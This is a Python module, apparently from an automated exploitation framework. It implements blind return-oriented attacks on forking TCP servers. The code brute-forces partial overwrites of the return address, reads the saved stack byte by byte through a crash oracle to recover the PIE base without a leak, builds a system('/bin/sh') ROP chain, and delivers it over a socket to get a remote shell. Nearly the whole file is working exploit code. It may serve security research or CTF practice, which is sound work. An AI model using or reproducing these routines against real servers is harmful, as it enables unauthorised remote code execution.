"""Leak-free PIE ret2win against a FORKING server (a BROP-style partial overwrite).

A one-shot process re-randomises its PIE base on every exec, so a leak-free partial overwrite can
only brute the 4 base bits in the second byte at ~1/16 per run -- probabilistic, and win() must sit
within ~64 KiB of the return site. A server that fork()s per connection is different: ASLR rolls
once at the parent's exec and every child INHERITS that layout, so the base is STABLE across
connections. That turns the brute DETERMINISTIC: the low byte of the return address is fixed by the
page offset, and the second byte carries the one unknown base nibble, so trying its 256 values is
GUARANTEED to hit win() -- no information leak, and in a bounded number of connections rather than a
1/16 gamble per process.

This module is the transport-agnostic core: it drives an `oracle(payload) -> output` callable, so
the byte-search is unit-tested against a simulated layout and reused over a real socket. The caller
confirms a real effect (a spawned shell evaluating a forgery-proof marker) and runs a negative
control; nothing here claims success on its own.
"""
from __future__ import annotations

import logging
import socket
import subprocess
import time
from pathlib import Path

_log = logging.getLogger(__name__)

_BYTE = range(256)


def candidate_overwrites(offset: int, win_off: int, *, aligns=(0, 1)):
    """Yield (payload, nbytes, align, second_byte) partial-overwrite candidates for a forking server
    whose layout is stable across connections.

    Byte 0 of the target return address is `(win_off+align) & 0xFF` -- deterministic, because the PIE
    base is page-aligned and contributes nothing below bit 12. A 1-byte overwrite hits when win() is
    in the same 256-byte block; otherwise byte 1 mixes the one unknown base nibble (bits 12-15) with
    the known page bits (8-11), so all 256 values of byte 1 are tried and one is guaranteed to land
    on win() when it is within 64 KiB of the return site. `aligns` covers win and win+1 (a system()
    call needs a 16-byte-aligned rsp; skipping the `push rbp` prologue flips the alignment)."""
    # 1-byte fast path for each alignment (win in the same 256-byte block).
    for align in aligns:
        b0 = (win_off + align) & 0xFF
        yield b"A" * offset + bytes([b0]), 1, align, None
    # 2-byte search (win within 64 KiB). INTERLEAVE the alignments: a system() call needs a
    # 16-byte-aligned rsp, so only one of win / win+1 works, and every attempt at the wrong
    # alignment crashes the child. Interleaving reaches the right alignment's correct second byte in
    # ~2*b1 connections instead of after a full wasted 256-attempt sweep of the other alignment.
    for b1 in _BYTE:
        for align in aligns:
            b0 = (win_off + align) & 0xFF
            yield b"A" * offset + bytes([b0, b1]), 2, align, b1


def brute_ret2win(oracle, offset: int, win_off: int, markers, *, aligns=(0, 1), cap: int = 600):
    """Drive `oracle(payload) -> output` with partial-overwrite candidates until a forking server's
    child reaches win() and its spawned shell EVALUATES the forgery-proof marker. Returns the winning
    (payload, nbytes, align) or None. Bounded by `cap` connections (2 aligns x (1 + 256) = 514)."""
    tried = 0
    for payload, nbytes, align, _b1 in candidate_overwrites(offset, win_off, aligns=aligns):
        if tried >= cap:
            break
        tried += 1
        if markers.proves(oracle(payload)):
            return payload, nbytes, align
    return None


# ------------------------------------------------------------------- socket transport (forking TCP)
def socket_oracle(port: int, follow: bytes, *, host: str = "127.0.0.1", timeout: float = 1.0,
                  gap: float = 0.15):
    """An `oracle(payload)` over a fresh TCP connection to a forking server: send the overflow, then
    `follow` (the marker command the spawned shell should evaluate), and return whatever comes back.
    A child that crashed on a wrong overwrite resets the connection and returns b"" -> not a win; a
    child that reached win()->system("/bin/sh") (with the client socket as its stdio) runs the
    command and returns its output, which `markers.proves` then grades."""
    def oracle(payload: bytes) -> bytes:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            s.sendall(payload)
            # Let the handler's single read() consume ONLY the overflow and return into win(): the
            # shell it spawns must read the marker command FRESH from the socket, not have it eaten
            # by the same read() that took the payload.
            if follow:
                time.sleep(gap)
                s.sendall(follow)
            chunks = []
            try:
                while True:
                    b = s.recv(4096)
                    if not b:
                        break
                    chunks.append(b)
            except socket.timeout:
                pass
            return b"".join(chunks)
        except OSError:
            return b""
        finally:
            try:
                s.close()
            except OSError:
                pass
    return oracle


def spawn_server(exe: str, argv, *, as_gb: int = 4, cpu_s: int = 120):
    """Spawn a server target once (its ASLR layout is then fixed for every forked child). Its own
    session so a kill reaps the whole group. Returns the Popen or None.

    The limits are deliberately LIGHT and -- unlike the fuzzing sandbox -- keep ASLR ON and do not
    cap the address space tightly: a BROP exploit's whole purpose is to defeat REAL ASLR with no
    leak, and the redirected child must be able to execve a shell, which the fuzzer's
    ADDR_NO_RANDOMIZE + tight RLIMIT_AS both break. A generous AS cap and no core dump still bound a
    runaway."""
    def _limits():
        import resource
        for res, val in ((resource.RLIMIT_CORE, (0, 0)),
                         (resource.RLIMIT_CPU, (cpu_s, cpu_s + 1)),
                         (resource.RLIMIT_AS, (as_gb << 30, as_gb << 30))):
            try:
                resource.setrlimit(res, val)
            except Exception:                            # noqa: BLE001
                pass
    try:
        return subprocess.Popen([str(exe)] + [str(a) for a in argv or []],
                                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL, start_new_session=True,
                                preexec_fn=_limits)
    except OSError:
        return None


def wait_for_port(proc, *, timeout: float = 5.0):
    """The TCP port the freshly-spawned server is listening on (read from /proc, no guessing), or
    None if it never listened. Reuses netfuzz's discovery so there is one definition of it."""
    from ..fuzz import netfuzz
    return netfuzz._wait_for_port(proc, "tcp", None, timeout)


# ---------------------------------------------- blind stack reading (no-win, no-leak PIE base)
# A forking server that sends a response ONLY AFTER the vulnerable function returns gives a
# crash-vs-survived oracle: a saved return address that keeps its real bytes lets the function
# return and the server responds; a corrupted byte crashes the child and no response comes. That
# oracle reads the saved return address off the stack ONE BYTE AT A TIME -- the byte value that
# survives is the real one -- recovering a live code pointer, and thus the PIE base, with no leak
# and no win() (classic BROP "stack reading"). The server's layout is stable across forked children,
# so the reads are deterministic rather than a 1/16 gamble.

def make_survive_oracle(port: int, *, host: str = "127.0.0.1", token: bytes = b"OK",
                        timeout: float = 0.8, tries: int = 3):
    """survives(payload) -> True iff the child did NOT crash (its post-return response `token`
    arrived). Retries a negative `tries` times: a real survival reliably sends the token, so a retry
    clears a transient socket timeout, while a real crash never sends it and stays False."""
    def survives(payload: bytes) -> bool:
        for _ in range(tries):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            try:
                s.connect((host, port))
                s.sendall(payload)
                try:
                    if token in s.recv(64):
                        return True
                except socket.timeout:
                    pass
            except OSError:
                pass
            finally:
                try:
                    s.close()
                except OSError:
                    pass
        return False
    return survives


def find_overflow_offset(survives, *, lo: int = 8, hi: int = 512):
    """The smallest overflow length that crashes the child -- the distance to the first saved
    pointer (saved rbp, just below the return address). b"A"*L survives while L stays within the
    buffer and crashes once it clobbers that pointer."""
    for L in range(lo, hi):
        if not survives(b"A" * L):
            return L - 1
    return None


def read_saved_bytes(survives, offset: int, nbytes: int) -> bytes:
    """Recover `nbytes` of saved stack data above `offset`, byte by byte: for each position the one
    byte value that still lets the child return (survives) is the real byte; the rest crash."""
    known = bytearray()
    for _ in range(nbytes):
        g = next((b for b in range(256)
                  if survives(b"A" * offset + bytes(known) + bytes([b]))), None)
        if g is None:                                    # past the reliably-crashing region
            break
        known.append(g)
    return bytes(known)


# A Linux PIE main image loads at 0x55xx.../0x56xx... under ASLR; the stack and libc live up at
# 0x7fxx.... This window isolates the saved RETURN address (an image code pointer) from the saved
# rbp (a stack pointer) in the same read, with no leak.
_IMG_LO, _IMG_HI = 0x400000, 0x600000000000


def _image_pointer(known: bytes):
    """The first 8-byte little-endian window in `known` that looks like a main-image code pointer
    (the saved return address), skipping the saved rbp (a high stack pointer)."""
    for i in range(0, max(0, len(known) - 7)):
        v = int.from_bytes(known[i:i + 8], "little")
        if _IMG_LO <= v < _IMG_HI:
            return v
    return None


def recover_pie_base_blind(survives, *, target_bytes=None, ret_site_off=None, offset=None,
                           read_words: int = 2):
    """Recover a forking PIE server's image base with NO leak and NO win(): find the overflow
    offset, stack-read the saved return address, and resolve the base from it. Returns
    (base, return_address, offset) or None.

    The return address's HIGH bits (the randomised base) read reliably -- a wrong high byte points
    to an unmapped page and crashes -- but its LOW byte does not (a wrong low byte can still land on
    valid code in the same 256-byte block and survive). So when `ret_site_off` is known (the
    autopilot has it: the vulnerable function's caller return site), its page-invariant low 12 bits
    are FORCED onto the reliably-read high bits rather than blind-read. Blind (only `target_bytes`),
    the low 12 bits must instead match a call-return site exactly, which needs a clean low-byte read."""
    if offset is None:
        offset = find_overflow_offset(survives)
    if offset is None:
        return None
    known = read_saved_bytes(survives, offset, read_words * 8)
    v = _image_pointer(known)
    if v is None:
        return None
    if ret_site_off is not None:
        ra = (v & ~0xFFF) | (ret_site_off & 0xFFF)       # force the page-invariant low 12 bits
        base = ra - ret_site_off
        if base > 0 and (base & 0xFFF) == 0:
            return base, ra, offset
        return None
    if target_bytes is not None:
        from . import exploit
        bases = {v - s for s in exploit._call_return_sites(target_bytes)
                 if (s & 0xFFF) == (v & 0xFFF) and v - s > 0 and ((v - s) & 0xFFF) == 0}
        if len(bases) == 1:                              # unambiguous site match
            return next(iter(bases)), v, offset
    return None


def build_ret2system_chain(exe_path, target_bytes, base: int, offset: int):
    """A system("/bin/sh") ROP payload rebased onto a recovered image `base`: cyclic filler to the
    saved return address, then [ret-align, pop rdi, &"/bin/sh", system@plt]. Returns the bytes, or
    None when the image lacks a pop-rdi gadget, a "/bin/sh" string, or a system PLT slot (then the
    caller needs the libc-leak path instead). No leak and no win() -- the base came from stack
    reading and every address is image+offset."""
    from . import rop
    pop = rop.find_gadget(target_bytes, "pop_rdi")
    binsh = rop.find_string(target_bytes, b"/bin/sh")
    system = rop.resolve_plt(exe_path, "system")
    if pop is None or binsh is None or not system:
        return None
    return rop.build_ret2system(offset, base + pop, base + binsh, base + system, 0,
                                ret_gadget=base + pop + 1)    # pop+1 is the trailing `ret` (align)


def drive_socket_shell(port: int, chain: bytes, follow: bytes, *, host: str = "127.0.0.1",
                       timeout: float = 1.5, gap: float = 0.2) -> bytes:
    """Deliver a ROP `chain` over one connection, then (after the child's shell has spawned) the
    `follow` marker command, and return everything the shell writes back over the socket."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(chain)
        time.sleep(gap)
        s.sendall(follow)
        time.sleep(gap)
        out = b""
        try:
            while True:
                d = s.recv(4096)
                if not d:
                    break
                out += d
        except socket.timeout:
            pass
        return out
    except OSError:
        return b""
    finally:
        try:
            s.close()
        except OSError:
            pass
